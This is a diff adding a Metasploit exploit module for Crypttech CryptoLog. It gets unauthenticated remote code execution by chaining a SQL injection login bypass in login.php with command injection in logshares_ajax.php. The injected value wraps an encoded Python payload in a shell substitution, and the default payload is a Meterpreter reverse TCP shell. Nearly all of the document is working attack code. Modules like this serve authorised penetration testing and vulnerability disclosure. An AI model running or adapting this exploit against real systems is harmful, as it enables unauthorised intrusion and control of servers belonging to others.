@@ -1,0 +1,112 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Crypttech CryptoLog Remote Code Execution",
+      'Description'    => %q{
+        This module exploits the sql injection and command injection vulnerability of CryptoLog. An un-authenticated user can execute a
+        terminal command under the context of the web user.
+
+        login.php endpoint is responsible for login process. One of the user supplied parameter is used by the application without input validation
+        and parameter binding. Which cause a sql injection vulnerability. Successfully exploitation of this vulnerability gives us the valid session.
+
+        logshares_ajax.php endpoint is responsible for executing an operation system command. It's not possible to access this endpoint without having
+        a valid session. One user parameter is used by the application while executing operating system command which cause a command injection issue.
+
+        Combining these vulnerabilities gives us opportunity execute operation system command under the context of the web user.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Mehmet Ince <mehmet@mehmetince.net>' # author & msf module
+        ],
+      'References'     =>
+        [
+          ['URL', 'https://pentest.blog/advisory-cryptolog-unauthenticated-remote-code-execution/']
+        ],
+      'DefaultOptions'  =>
+        {
+          'Payload'  => 'python/meterpreter/reverse_tcp'
+        },
+      'Platform'       => ['python'],
+      'Arch'           => ARCH_PYTHON,
+      'Targets'        => [[ 'Automatic', { }]],
+      'Privileged'     => false,
+      'DisclosureDate' => "May 3 2017",
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+      [
+        Opt::RPORT(80),
+        OptString.new('TARGETURI', [true, 'The URI of the vulnerable CryptoLog instance', '/'])
+      ]
+    )
+  end
+
+  def bypass_login
+    r = rand_text_alpha(15)
+    i = rand_text_numeric(5)
+
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'cryptolog', 'login.php'),
+      'vars_get' => {
+        'act' => 'login'
+      },
+      'vars_post' => {
+        'user' => "' OR #{i}=#{i}#",
+        'pass' => "#{r}"
+      }
+    })
+
+    if res && res.code == 302 && res.headers.include?('Set-Cookie')
+      res.get_cookies
+    else
+      nil
+    end
+  end
+
+  def check
+    if bypass_login.nil?
+      Exploit::CheckCode::Safe
+    else
+      Exploit::CheckCode::Appears
+    end
+  end
+
+  def exploit
+    print_status("Bypassing login by exploiting SQLi flaw")
+
+    cookie = bypass_login
+
+    if cookie.nil?
+      fail_with(Failure::Unknown, "Something went wrong.")
+    end
+
+    print_good("Successfully logged in")
+
+    print_status("Exploiting command injection flaw")
+    r = rand_text_alpha(15)
+
+    send_request_cgi({
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'cryptolog', 'logshares_ajax.php'),
+      'cookie'    => cookie,
+      'vars_post' => {
+        'opt' => "check",
+        'lsid' => "$(python -c \"#{payload.encoded}\")",
+        'lssharetype' => "#{r}"
+      }
+    })
+
+  end
+end
